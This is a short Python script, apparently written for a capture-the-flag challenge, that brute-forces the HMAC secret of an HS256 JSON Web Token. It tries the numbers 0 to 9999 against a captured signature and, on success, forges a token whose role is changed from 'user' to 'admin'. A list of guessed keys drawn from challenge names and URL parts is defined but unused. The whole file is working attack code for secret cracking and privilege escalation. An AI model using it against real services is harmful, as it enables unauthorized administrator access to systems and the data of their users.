import hmac
import hashlib
import base64
import subprocess
import json
import string

original_payload_b64 = 'eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ3MDY3MTJ9'
original_signature = 'CqErZOY8Ac-MBNgnLOXKu8G1WJlUzOIcrIkpu9ji6gA'

admin_payload = {'sub': '1', 'role': 'admin', 'exp': 1774706712}
admin_payload_b64 = base64.urlsafe_b64encode(json.dumps(admin_payload, separators=(',', ':')).encode()).decode().rstrip('=')

header = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'

# 更多可能的密钥
possible_keys = [
    '80', 'port80', 'ctfplus', 'challenge',
    '3829ff0b', '6e8846979c8987d2b7b04632',  # URL parts
    'star2024', 'ctf2024',
]

# 尝试数字组合
for i in range(10000):
    key = str(i)
    message = header + '.' + original_payload_b64
    signature = hmac.new(key.encode(), message.encode(), hashlib.sha256).digest()
    signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

    if signature_b64 == original_signature:
        print(f'✅ FOUND KEY: {key!r}')

        message_admin = header + '.' + admin_payload_b64
        signature_admin = hmac.new(key.encode(), message_admin.encode(), hashlib.sha256).digest()
        signature_admin_b64 = base64.urlsafe_b64encode(signature_admin).decode().rstrip('=')
        jwt_admin = message_admin + '.' + signature_admin_b64

        print(f'Admin JWT: {jwt_admin}')
        break
else:
    print('Numeric keys 0-9999: not found')
